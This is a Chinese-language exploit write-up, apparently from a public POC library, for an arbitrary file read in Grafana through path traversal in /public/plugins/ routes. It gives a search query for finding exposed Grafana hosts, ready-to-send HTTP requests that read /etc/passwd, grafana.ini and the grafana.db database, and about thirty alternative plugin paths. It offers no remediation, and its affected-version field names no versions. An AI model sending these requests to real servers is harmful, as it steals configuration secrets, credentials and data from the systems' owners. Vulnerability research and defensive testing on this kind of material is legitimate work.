# Grafana存在任意文件读取漏洞

# 一、漏洞描述
Grafana是一个开源的可视化和分析平台，一个通用的可视化工具。‘通用’意味着Grafana不仅仅适用于展示Prometheus下的监控数据，也同样适用于一些其他的数据可视化需求。Grafana存在任意文件读取漏洞

# 二、影响版本
Grafana

# 三、资产测绘
```plain
app="Grafana"
```


# 三、漏洞复现
```plain
GET /public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 
Content-Length: 2
```


读取配置文件

```plain
GET /public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
Host: 
Content-Length: 2
```

数据库

```plain
GET /public/plugins/gettingstarted/../../../../../../../../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1
Host: 
Content-Length: 2
```

其他读取路径

```plain
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qkw3xd9rwpw26kmc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
